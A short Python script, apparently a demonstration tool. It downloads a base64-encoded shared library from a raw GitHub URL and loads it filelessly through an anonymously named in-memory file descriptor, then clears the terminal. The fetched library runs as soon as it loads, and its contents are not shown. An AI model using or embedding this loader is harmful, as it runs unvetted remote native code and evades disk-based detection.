import os
import mmap
import importlib.machinery
import base64
import secrets
import string
from urllib.request import urlopen


# Load bytes from .so file into memory like how we would type "import acb".
def load_so_bytes(lib_bytes, module_name):
    mem_map = mmap.mmap(-1, len(lib_bytes), mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS)
    mem_map.write(lib_bytes)
    mem_map.seek(0)
    all_characters = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
    pname = ''.join(secrets.choice(all_characters) for _ in range(64))
    fd = os.memfd_create(pname, flags=os.MFD_CLOEXEC)
    os.write(fd, mem_map)
    loader = importlib.machinery.ExtensionFileLoader(module_name, f"/proc/self/fd/{fd}")
    module = loader.load_module(module_name)
    os.close(fd)
    mem_map.close()
    return module


if __name__ == "__main__":
    # This code will be ran/executed automatically on import since the code in code.txt has no if name == main to stop it from executing the code.
    url = "https://raw.githubusercontent.com/therealOri/IMLL/refs/heads/main/code.txt"
    response = urlopen(url)
    content = response.read().decode('utf-8')
    lib_bytes = base64.b64decode(content)
    module_name='code' #name of the .so file when created.
    os.system("clear||cls")
    load_so_bytes(lib_bytes, module_name)
